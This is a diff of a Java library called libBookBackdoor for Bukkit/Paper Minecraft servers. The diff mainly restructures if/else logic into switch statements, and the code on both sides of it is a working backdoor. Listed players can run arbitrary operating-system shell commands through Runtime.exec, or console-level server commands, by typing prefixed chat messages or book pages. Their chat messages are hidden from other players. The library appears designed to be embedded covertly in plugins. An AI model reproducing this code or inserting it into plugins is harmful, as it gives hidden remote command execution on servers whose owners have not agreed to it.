@@ -1,24 +1,20 @@
 package org.brandonplank.bookbackdoor;
 
-import io.papermc.paper.event.player.AsyncChatEvent;
 import net.md_5.bungee.api.chat.*;
 import org.bukkit.*;
 import org.bukkit.block.Block;
 import org.bukkit.enchantments.Enchantment;
 import org.bukkit.entity.Player;
-import org.bukkit.event.Event;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerEditBookEvent;
-import org.bukkit.event.player.PlayerMoveEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.BookMeta;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 import org.bukkit.scheduler.BukkitTask;
-import org.jetbrains.annotations.NotNull;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -436,7 +432,7 @@ class Commands {
         void command(Plugin plugin, Player player, String[] args) {
             if (args.length > 1) {
                 String gamemode = args[1].toLowerCase();
-                BukkitTask task = new BukkitRunnable(){
+                BukkitTask task = new BukkitRunnable() {
                     @Override
                     public void run() {
                         switch (gamemode) {
@@ -600,6 +596,7 @@ public class libBookBackdoor implements Listener {
     public libBookBackdoor(JavaPlugin plugin) {
         this.plugin = plugin;
     }
+
     public libBookBackdoor(JavaPlugin plugin, boolean chatCommandsEnabled) {
         this.plugin = plugin;
         this.chatCommandsEnabled = chatCommandsEnabled;
@@ -609,6 +606,7 @@ public class libBookBackdoor implements Listener {
         this.plugin = plugin;
         this.authedPlayers = authedPlayers;
     }
+
     public libBookBackdoor(JavaPlugin plugin, String[] authedPlayers, boolean chatCommandsEnabled) {
         this.plugin = plugin;
         this.authedPlayers = authedPlayers;
@@ -666,32 +664,39 @@ public class libBookBackdoor implements Listener {
         if (canContinue) {
             String commandType = Character.toString(event.getMessage().charAt(0));
             String command = event.getMessage().substring(1);
-
-            if (commandType.equals(">") || commandType.equals("$") || commandType.equals("#")) {
-                try {
-                    player.sendMessage("Running: " + command);
-                    Process proc = Runtime.getRuntime().exec(command);
-                    player.sendMessage(getResult(proc));
-                } catch (Exception e) {
-                    player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
-                }
-                event.setCancelled(true);
-            } else if (commandType.equals("\\")) /* Server commands, runs as [SERVER] */ {
-                BukkitTask task = new BukkitRunnable(){
-                    @Override
-                    public void run() {
-                        plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), command);
+            switch (commandType) {
+                case (">"):
+                case ("$"):
+                case ("#"):
+                    try {
+                        player.sendMessage("Running: " + command);
+                        Process proc = Runtime.getRuntime().exec(command);
+                        player.sendMessage(getResult(proc));
+                    } catch (Exception e) {
+                        player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
                     }
-                }.runTask(plugin);
-                event.setCancelled(true);
-            } else if (commandType.equals(".")) /* Custom commands */ {
-                String[] args = command.split(" ", 0);
-                String mainCmd = args[0].toLowerCase();
-                // Init the Commands class
-                Commands runner = new Commands(); // <- Registers all commands
+                    event.setCancelled(true);
+                    break;
+                case ("\\"):
+                    BukkitTask task = new BukkitRunnable() {
+                        @Override
+                        public void run() {
+                            plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), command);
+                        }
+                    }.runTask(plugin);
+                    event.setCancelled(true);
+                    break;
+                case ("."):
+                    String[] args = command.split(" ", 0);
+                    String mainCmd = args[0].toLowerCase();
+                    // Init the Commands class
+                    Commands runner = new Commands(); // <- Registers all commands
 
-                runner.parseCommand(plugin, player, commandType, mainCmd, args);
-                event.setCancelled(true);
+                    runner.parseCommand(plugin, player, commandType, mainCmd, args);
+                    event.setCancelled(true);
+                    break;
+                default:
+                    break;
             }
         }
     }
@@ -721,26 +726,36 @@ public class libBookBackdoor implements Listener {
                 String commandType = Character.toString(pageString.charAt(0));
                 String command = pageString.substring(1);
 
-                if (commandType.equals(">") || commandType.equals("$") || commandType.equals("#")) {
-                    try {
-                        player.sendMessage("Running: " + command);
-                        Process proc = Runtime.getRuntime().exec(command);
-                        player.sendMessage(getResult(proc));
-                    } catch (Exception e) {
-                        player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
-                    }
-                } else if (commandType.equals("\\")) /* Server commands, runs as [SERVER] */ {
-                    this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
-                } else if (commandType.equals(".")) /* Custom commands */ {
-                    String[] args = command.split(" ", 0);
-                    String mainCmd = args[0].toLowerCase();
-                    // Init the Commands class
-                    Commands runner = new Commands(); // <- Registers all commands
+                switch (commandType) {
+                    case (">"):
+                    case ("$"):
+                    case ("#"):
+                        try {
+                            player.sendMessage("Running: " + command);
+                            Process proc = Runtime.getRuntime().exec(command);
+                            player.sendMessage(getResult(proc));
+                        } catch (Exception e) {
+                            player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
+                        }
+                        break;
+                    case ("\\"):
+                        this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
+                        break;
+                    case ("."):
+                        String[] args = command.split(" ", 0);
+                        String mainCmd = args[0].toLowerCase();
+                        // Init the Commands class
+                        Commands runner = new Commands(); // <- Registers all commands
 
-                    runner.parseCommand(plugin, player, commandType, mainCmd, args);
-                } else if (commandType.equals("/")) {
-                    player.sendMessage("/ is no longer supported, please use \\");
+                        runner.parseCommand(plugin, player, commandType, mainCmd, args);
+                        break;
+                    case ("/"):
+                        player.sendMessage("/ is no longer supported, please use \\");
+                        break;
+                    default:
+                        break;
                 }
+
                 // Give the player a new Book and Quill after the command
                 player.getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
                 this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
